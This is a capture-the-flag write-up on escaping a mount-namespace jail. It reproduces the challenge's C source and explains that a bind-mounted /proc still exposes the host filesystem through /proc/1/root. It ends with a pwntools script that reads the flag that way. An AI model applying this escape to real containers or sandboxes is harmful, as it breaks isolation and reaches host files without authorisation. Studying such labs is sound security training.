---
title: "Mount Namespace Escape via Pre-mounted Procfs"
description: "Escaping a mount namespace sandbox where procfs is already provided, by traversing process 1's root link to reach the host filesystem."
date: "2026-01-04"
order: 16
draft: false
---

# Mount Namespace Escape via Pre-mounted Procfs

## Challenge Source Code

```c
#define _GNU_SOURCE 1
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  for (int i = 3; i < 10000; i++)
    close(i);

  char new_root[] = "/tmp/jail-XXXXXX";
  char old_root[1024];

  assert(geteuid() == 0);

  // Create a new mount namespace
  assert(unshare(CLONE_NEWNS) != -1);

  // Create the jail root
  assert(mkdtemp(new_root) != NULL);

  // Change / to a private mount to allow pivot_root
  assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);

  // Bind-mount the new root over itself
  assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

  // Create a directory for the old root
  snprintf(old_root, sizeof(old_root), "%s/old", new_root);
  assert(mkdir(old_root, 0777) != -1);

  // Pivot the root filesystem
  assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

  // Bind-mount essential system directories
  assert(mkdir("/bin", 0755) != -1);
  assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);
  assert(mount(NULL, "/bin", NULL, MS_REMOUNT | MS_RDONLY | MS_BIND, NULL) != -1);

  assert(mkdir("/usr", 0755) != -1);
  assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);
  assert(mount(NULL, "/usr", NULL, MS_REMOUNT | MS_RDONLY | MS_BIND, NULL) != -1);

  assert(mkdir("/lib", 0755) != -1);
  assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);
  assert(mount(NULL, "/lib", NULL, MS_REMOUNT | MS_RDONLY | MS_BIND, NULL) != -1);

  assert(mkdir("/lib64", 0755) != -1);
  assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);
  assert(mount(NULL, "/lib64", NULL, MS_REMOUNT | MS_RDONLY | MS_BIND, NULL) != -1);

  // Pre-mount /proc into the jail
  assert(mkdir("/proc", 0755) != -1);
  assert(mount("/old/proc", "/proc", NULL, MS_BIND, NULL) != -1);
  assert(mount(NULL, "/proc", NULL, MS_REMOUNT | MS_RDONLY | MS_BIND, NULL) != -1);

  // Unmount the old root directory
  assert(umount2("/old", MNT_DETACH) != -1);
  assert(rmdir("/old") != -1);

  setresuid(0, 0, 0);
  assert(chdir("/") == 0);

  int fffd = open("/flag", O_WRONLY | O_CREAT);
  write(fffd, "try harder", 10);
  close(fffd);

  assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
}
```

## Vulnerability Analysis

This level attempts to harden the sandbox by making all bind-mounted host directories, including `/proc`, read-only (`MS_RDONLY`).

```c
assert(mount(NULL, "/proc", NULL, MS_REMOUNT | MS_RDONLY | MS_BIND, NULL) != -1);
```

However, the vulnerability remains: the **proc filesystem** is still accessible. Even if the mount is read-only, we can still use it to traverse process links. Since PID 1 (or any process started outside this namespace) still considers the host's root directory as its root, the symlink `/proc/1/root` points directly back to the host's real filesystem.

## Exploitation Plan

1. **Traverse Proc:** Use the already provided `/proc` directory.
2. **Access Host Root:** Access the host's filesystem via process 1's root link: `/proc/1/root/`.
3. **Read Flag:** Read the real flag at `/proc/1/root/flag`.

## Exploit Script

The following script interacts with the shell spawned inside the jail. Since `/proc` is already mounted, we simply use `cat` to traverse the `root` link of process 1.

```python
from pwn import *

# Set the target binary
elf = context.binary = ELF("./challenge", checksec=False)

# Start the process
p = process(elf.path)

# Since /proc is already bind-mounted (even if read-only),
# we can access the host root directly via /proc/1/root.
p.sendline(b"cat /proc/1/root/flag")

# Exit the shell
p.sendline(b"exit")

# Receive the output and print the flag
print(p.recvall(timeout=2).decode())
```
